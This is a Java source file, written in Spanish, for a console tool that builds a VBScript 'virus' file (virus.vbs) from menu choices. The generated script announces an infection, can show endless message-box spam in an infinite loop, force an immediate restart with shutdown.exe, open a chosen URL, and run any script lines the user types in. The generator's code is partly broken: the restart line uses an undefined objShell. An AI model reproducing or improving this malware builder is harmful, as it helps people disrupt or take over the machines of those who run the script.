package VBSlanguages;

import java.io.*;
import java.util.Scanner;

public class VBSspanish {

    public static final String ANSI_RESET = "\u001B[0m";
    public static final String ANSI_BLACK = "\u001B[30m";
    public static final String ANSI_RED = "\u001B[31m";
    public static final String ANSI_GREEN = "\u001B[32m";
    public static final String ANSI_YELLOW = "\u001B[33m";
    public static final String ANSI_BLUE = "\u001B[34m";
    public static final String ANSI_PURPLE = "\u001B[35m";
    public static final String ANSI_CYAN = "\u001B[36m";
    public static final String ANSI_WHITE = "\u001B[37m";

    public static void mostrarOpciones()
    {
        System.out.println("1- Abrir otra alerta");
        System.out.println("2- Abrir pagina web");
        System.out.println("3- Apagar PC");
        System.out.println("4- Script Personalizado");
        System.out.println("5- Mensaje SPAM");
        System.out.println("6- Terminar virus");
    }

    public static void vbsSpanish() {
        Scanner scanner = new Scanner(System.in);
        System.out.print(ANSI_WHITE + "Ahora dime el nombre de tu virus: ");
        String nombreVirus = scanner.nextLine();
        System.out.println("Entonces el nombre de tu virus sera: " + nombreVirus);

        File virus = new File("virus.vbs");
        try {
            PrintWriter salidaVirus = new PrintWriter(new FileWriter(virus, true));
            salidaVirus.println("msgbox(\"" + "Has sido infectado por el virus: " + nombreVirus + "\")");
            System.out.println("Ahora selecciona lo que quieres que tu virus haga: ");

            for (int i = 0; i <= 1000; i++) {
                int option;
                mostrarOpciones();
                option = Integer.parseInt(scanner.nextLine());

                //ACCIONES
                if (option == 1)
                {
                    String mensajeOtraAlerta;
                    System.out.println("Ahora dime que mensaje quieres que aparezca: ");
                    mensajeOtraAlerta = scanner.nextLine();
                    salidaVirus.println("msgbox(\"" + mensajeOtraAlerta + "\")");
                }
                else if (option == 2)
                {
                    String redirectURL;
                    System.out.println("Ahora dime a que URL quieres que redirija el virus: ");
                    redirectURL = scanner.nextLine();
                    salidaVirus.println("Dim wShell");
                    salidaVirus.println("Set wShell = CreateObject(\"WScript.Shell\")");
                    salidaVirus.println("wShell.Run \"" + redirectURL + "\"" + ",9");
                }
                else if (option == 3)
                {
                    salidaVirus.println("rc = objShell.Run \"C:\\WINDOWS\\system32\\shutdown.exe -r -t 0\", 0, True");
                    salidaVirus.println("If rc <> 0 Then MsgBox \"shutdown failed with exit code \" & rc & \".\"");
                }
                else if (option == 4)
                {
                    String scriptPersonalizado;
                    System.out.println("Escribe el script personalizado: ");
                    System.out.println("NOTA: Estoy desarrollando una forma de hacer un script multilinea, por favor espera...");
                    System.out.println("Por ahora para hacer eso tienes que seleccionar la opcion de script personalizado mas de una ves para hacer un script multilinea");
                    scriptPersonalizado = scanner.nextLine();
                    salidaVirus.println(scriptPersonalizado);
                }
                else if (option == 5)
                {
                    String mensajeSpam;
                    System.out.println("Dime que mensaje quieres que el programa haga spam: ");
                    mensajeSpam = scanner.nextLine();
                    salidaVirus.println("do" + "\n" + "x=MsgBox(\"" + mensajeSpam + "\"," + "vbOkOnly+vbCritical," + "\"" + mensajeSpam + "\"" + ")" + "\n" + "loop");
                }
                else if (option == 6)
                {
                    System.out.println("BYE!");
                    salidaVirus.close();
                    break;
                }
                else {
                    System.out.println(ANSI_RED + "ERROR 4.");
                }
                i++;
            }
        } catch (Exception e) {
            System.out.println(ANSI_RED + "ERROR 2.");
        }
    }
}
